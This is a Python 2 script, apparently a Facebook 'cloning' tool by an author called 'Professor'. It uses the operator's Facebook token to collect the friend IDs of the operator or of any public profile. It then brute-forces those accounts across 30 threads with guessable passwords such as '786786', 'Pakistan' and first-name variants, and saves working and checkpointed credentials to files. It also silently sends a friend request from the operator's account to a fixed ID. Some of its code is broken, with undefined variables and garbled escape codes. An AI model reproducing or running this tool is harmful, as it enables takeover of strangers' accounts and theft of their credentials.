#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mr....Professor
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\AFRIDI[%s;1m'%str(31+j))
    x += '\AFRIDI[0m'
    x = x.replace('!0','\AFRIDI[0m')
    sys.stdout.write(x+'\n')


def Professor(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Professor
##### LOGO #####
logo = """
       \AFRIDI[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
      \AFRIDI[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
     \AFRIDI[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
    \AFRIDI[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
   \AFRIDI[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
  \AFRIDI[1;96m::♧♧♧♧♧♧♧♧♧♧\AFRIDI[1;91mWhatsapp\AFRIDI[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
  \AFRIDI[1;91m:》》》\AFRIDI[1;93m+923094161457\AFRIDI[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\AFRIDI[1;95m♡╭──────────•◈•──────────╮♡\AFRIDI[1;96m-Professor-\AFRIDI[1;95m♡╭──────────•◈•──────────╮♡
\AFRIDI[1;92m..........................Professor......................
\AFRIDI[1;93m
\AFRIDI[1;93m.                ▀▄▀▄▀▄🄿🅁🄾🄵🄴🅂🅂🄾🅁▀▄▀▄▀▄
\AFRIDI[1;93m
\AFRIDI[1;95m♡╰──────────•◈•──────────╯♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡╰──────────•◈•──────────╯♡"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\AFRIDI[31mNot Vuln"
vuln = "\AFRIDI[32mVuln"

os.system("clear")
print  """
  \AFRIDI[1;96m-┈┈┈┈┈┈┈┈┈┈┈  ╱▔▔▔▔╲┈┈┈┈┈┈┈┈         
  \AFRIDI[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊P┊╱ ▏┈┈┈┈┈┈┈        
  \AFRIDI[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏ ▏┈┈┈┈┈┈┈   
 \AFRIDI[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊R┊┊╱┈┈┈┈┈┈┈┈   
 \AFRIDI[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
 \AFRIDI[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \AFRIDI[1;96m ─────────────•◈•──────────  
   \AFRIDI[1;92m███████▒▒Welcome To Professor▒▒████████
\AFRIDI[1;95m♡╭──────────•◈•──────────╮♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡╭──────────•◈•──────────╮♡
\AFRIDI[1;94mAuthor\AFRIDI[1;91m: \AFRIDI[1;91mMr....Professor
\AFRIDI[1;94Professor\AFRIDI[1;91m: \AFRIDI[1;91▒▓██████████████]99.9
\AFRIDI[1;94mFacebook\AFRIDI[1;91m: \AFRIDI[1;91mMr....Professor
\AFRIDI[1;94mWhatsapp\AFRIDI[1;91m: \AFRIDI[1;91m+923094161457
\AFRIDI[1;95m♡╰──────────•◈•──────────╯♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡╰──────────•◈•──────────╯♡"""
Professor('              \AFRIDI[1;96m....................Professor.....................:')
Professor("\AFRIDI[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
Professor('\AFRIDI[1;93m   ┈┈┈┈┈┈┈▕▕╲┊P┊╱▏▏┈┈┈┈┈┈┈   ')
Professor('\AFRIDI[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
Professor("\AFRIDI[1;93m   ┈┈┈┈┈┈┈┈╲┊┊R┊┊╱┈┈┈┈┈┈┈┈ ")
Professor("\AFRIDI[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\AFRIDI[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\AFRIDI[1;96mLogin Professor\AFRIDI[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "Professor"
CorrectPassword = "Mr....Professor"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\AFRIDI[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\AFRIDI[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Professor
	    time.sleep(2)
            loop = 'false'
        else:
            print "\AFRIDI[1;91mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\AFRIDI[1;94mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		Professor(' \AFRIDI[1;92mWarning: \AFRIDI[1;97mDo Not Use Your Personal Account' )
		Professor(' \AFRIDI[1;92m   Note: \AFRIDI[1;97mUse a New Account To Login' )
		print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
		print('	   \AFRIDI[1;94m♡\x1b[1;91m》》》》》》▀▄▀▄▀▄🄿🅁🄾🄵🄴🅂🅂🄾🅁▀▄▀▄▀▄《《《《《《\x1b[1;94m♡' )
		print('	' )
		id = raw_input('\AFRIDI[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
		pwd = raw_input('\AFRIDI[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\AFRIDI[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Professor
	print logo
	print "  \AFRIDI[1;95m«-----♡----\AFRIDI[1;93mLogged in User Info\AFRIDI[1;95m----♡-----»"
	print "	   \AFRIDI[1;94m Name\AFRIDI[1;93m:\AFRIDI[1;92m"+nama+"\AFRIDI[1;97m               "
	print "	   \AFRIDI[1;97m ID\AFRIDI[1;93m:\AFRIDI[1;92m"+id+"\x1b[1;97m              "
	print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
	print "\AFRIDI[1;97m--\AFRIDI[1;92m> \AFRIDI[1;92m1.\x1b[1;92mStart Cloning..."
	print "\AFRIDI[1;97m--\AFRIDI[1;91m> \AFRIDI[1;91m0.\AFRIDI[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\AFRIDI[1;91mChoose an Option>>> \AFRIDI[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		Professor('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\AFRIDI[1;96m--\AFRIDI[1;92m> \AFRIDI[1;92m1.\x1b[1;91mClone From Friend List..."
	print "\AFRIDI[1;96m--\AFRIDI[1;92m> \AFRIDI[1;92m2.\x1b[1;91mClone From Public ID..."
	print "\AFRIDI[1;96m--\AFRIDI[1;91m> \AFRIDI[1;91m0.\AFRIDI[1;94mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\AFRIDI[1;97mChoose an Option>>> \AFRIDI[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
		Professor('\AFRIDI[1;93mGetting IDs \AFRIDI[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\AFRIDI[1;96m[♡] \AFRIDI[1;92mEnter ID\AFRIDI[1;93m: \AFRIDI[1;97m")
		print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────╯♡"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\AFRIDI[1;93mName\AFRIDI[1;93m:\AFRIDI[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\AFRIDI[1;96m[\AFRIDI[1;94mBack\AFRIDI[1;96m]")
			super()
		print"\AFRIDI[1;93mGetting IDs\AFRIDI[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\AFRIDI[1;91mTotal IDs\AFRIDI[1;93m: \AFRIDI[1;94m"+str(len(id))
	Professor('\AFRIDI[1;92mPlease Wait\AFRIDI[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\AFRIDI[1;91mCloning\AFRIDI[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\AFRIDI[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\AFRIDI[1;94m----»"
	print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
	Professorĺ(' \AFRIDI[1;93m ........Cloning Start plzzz Wait.......... ')
	print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Professor
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = a['first_name'] + 'Professor'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'Professor'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Professor'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'Professor'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'Professor'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\AFRIDI[1;95m♡──────────•◈•──────────♡\AFRIDI[1;96Professor\AFRIDI[1;95m♡──────────•◈•──────────♡"
	print "  \AFRIDI[1;93m«---•◈•---Developed By Professor---•◈•---»" #Professor
	print '\AFRIDI[1;91mProcess Has Been Completed\AFRIDI[1;92m....'
	print"\AFRIDI[1;91mTotal OK/\x1b[1;93mCP \AFRIDI[1;91m: \AFRIDI[1;91m"+str(len(oks))+"\AFRIDI[1;97m/\AFRIDI[1;95m"+str(len(cekpoint))
	print """
             
             ...........███ ]▄▄▄▄▄▃
             ..▂▄▅█████▅▄▃▂
             [███████████████]
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \AFRIDI[1;96m .....Mr......Professor........... \AFRIDI[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               Professor"""
	
	raw_input("\n\AFRIDI[1;92m[\AFRIDI[1;94mBack\AFRIDI[1;96m]")
	menu()

if __name__ == '__main__':
	login()
